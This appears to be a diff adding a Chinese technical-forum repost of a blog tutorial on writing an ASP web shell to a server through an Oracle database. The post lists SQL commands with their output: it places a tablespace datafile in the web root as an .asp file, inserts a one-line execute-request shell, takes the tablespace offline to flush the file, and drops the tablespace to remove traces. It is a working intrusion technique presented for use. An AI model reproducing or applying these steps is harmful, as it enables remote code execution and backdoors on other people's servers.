@@ -1,0 +1,33 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+ORACLE 建立数据文件WriteWebShell
+D8888D主贴内容-------------------------------------------------------
+作者： [url=http://blog.csdn.net/kj021320/archive/2008/10/12/3062115.aspx]链接标记kj021320[/url]
+转载请注明出处
+其实 类似ORACLE 这样强大的数据库，真没必要用到这么土的办法
+SQLJ   存储过程写文件也可以，逼于无奈对方机器不支持SQLJ  还有  UTL_FILE包也被干掉了？
+那 也可以 使用以下我说的这个方式
+
+
+SQL> create tablespace kjtest datafile 'e:\website\kj.asp' size 100k nologging ;
+表空间已创建。
+这里记住了  100K为ORACLE 表空间最小的单位，如果你的一句话SHELL比较大 那可以200K比较稳妥
+但是最终建议一句话一定要最最简洁
+SQL> CREATE TABLE WEBSHELL(C varchar2(100)) tablespace kjtest;
+表已创建。
+一般用 VARCHAR类型已经可以 ，表空间太小了 ，所以不可以 为 CLOB或者 BLOB类型。
+SQL> insert into WEBSHELL values('<%execute request("kj021320")%>');
+已创建 1 行。
+SQL> commit;
+提交完成。
+提交完成之后就 OK？ NO~ 因为数据还没有被 DBWn 进程刷到文件呢. 所以需要同步一下CKPT以及OFFLINE当前表空间
+SQL> alter tablespace kjtest offline;
+表空间已更改。
+到这里 你的 一句话SHELL代码已经 写到 那个文件了
+你会发现有这样的 <%execute request("kj021320")%>Z   ?Z    的 代码
+一句话shell已经OK了
+最后使用后记得吧 表空间删除
+SQL> drop tablespace kjtest including contents;
+表空间已删除。
+当然这个方法缺点就是你要知道WEB路径
